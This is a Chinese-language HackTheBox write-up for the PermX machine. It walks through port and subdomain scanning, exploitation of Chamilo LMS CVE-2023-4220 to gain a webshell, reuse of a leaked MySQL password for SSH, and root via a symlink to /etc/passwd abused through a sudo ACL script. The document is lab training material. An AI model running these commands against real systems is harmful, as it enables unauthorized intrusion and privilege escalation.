---
title: "HTB-PermX"
date: 2024-09-03
categories: 
  - "HTB-Machine"
tags: 
  - "hackthebox"
  - "linux"
---

## Box Info

| OS | Linux |
| --- | --- |
| Difficulty | Easy |

## Basic Scan

### Nmap

```
namp 10.10.11.23 -A -O
```

![](./images/image.png)

**Opened Ports：22、80**

**Server：Apache 2.4.52 (Ubuntu)**

### Subdomain Fuzzing

Github：[TheKingOfDuck/fuzzDicts: Web Pentesting (github.com)](https://github.com/TheKingOfDuck/fuzzDicts)

```
ffuf -w main.txt -u http://permx.htb/ -H "Host:FUZZ.permx.htb" -mc 200
```

![](./images/image-3.png)

找到两个子域名：**www**、**lms**

更新**/etc/hosts**

![](./images/image-4.png)

### Dirsearch

```
dirsearch -u http://permx.htb/
```

![](./images/image-1.png)

```
dirsearch  -u lms.permx.htb
```

![](./images/image-5.png)

在**LICENSE**里得到**Chamilo LMS**的版本信息

![](./images/image-6.png)

### Gobuster

```
gobuster dir -u http://permx.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
```

![](./images/image-2.png)

## CVE-2023-4220

Github：[Rai2en/CVE-2023-4220-Chamilo-LMS: CVE-2023-4220 (github.com)](https://github.com/Rai2en/CVE-2023-4220-Chamilo-LMS)

![](./images/image-7.png)

![](./images/image-8.png)

成功上传webshell

![](./images/image-9.png)

![](./images/image-10.png)

以及反弹shell

![](./images/image-11.png)

![](./images/image-12.png)

发现mysql用户名以及密码

![](./images/image-13.png)

```
mysql -u chamilo -p03F6lY3uXAP2bkW8

select username,password from user;
```

![](./images/image-14.png)

尝试进行爆破，失败。

![](./images/image-15.png)

存在一个mtz的用户，尝试用数据库的密码进行ssh登录，成功。

![](./images/image-16.png)

![](./images/image-17.png)

## Privilege Escalation

![](./images/image-20.png)

![](./images/image-21.png)

这个脚本用于确保安全地为 `/home/mtz/` 目录下的某个文件设置**特定用户的权限**，防止未经授权的目录访问或操作。

```
touch test
ln -sf /etc/passwd /home/mtz/test  # 将test链接到/etc/passwd
sudo /opt/acl.sh mtz rw /home/mtz/test  #给test文件设置为mtz，并且可读可写
echo "hyh::0:0:hyh:/root:/bin/bash" >> ./test #将用户信息写入test
su hyh 
```

![](./images/image-22.png)

## Summary

端口、子域名扫描获取web服务相关信息。从CVE入手获取到普通shell权限。

在/opt/acl.sh中可以构造软链接，将写入的用户信息链接到/etc/passwd即可获取root权限。
